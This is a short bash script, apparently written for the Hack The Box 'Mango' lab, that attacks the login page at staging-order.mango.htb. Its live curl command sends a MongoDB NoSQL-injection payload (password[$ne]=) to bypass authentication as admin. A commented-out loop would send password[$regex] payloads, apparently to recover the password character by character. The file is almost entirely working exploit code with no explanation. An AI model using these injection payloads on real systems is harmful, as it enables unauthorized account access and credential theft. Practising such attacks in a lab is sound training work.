#!/bin/bash


curl -X POST -d "username=admin&password[%24ne]=" http://staging-order.mango.htb/index.php -s -o /dev/null -w "%{http_code}"

# file="test"
# while IFS= read -r line; do
# 	echo "Trying $line"
# 	curl -X POST -d "username=admin&password[$regex]=" http://staging-order.mango.htb/index.php -s -o /dev/null -w "%{http_code}"
# done < "$file"
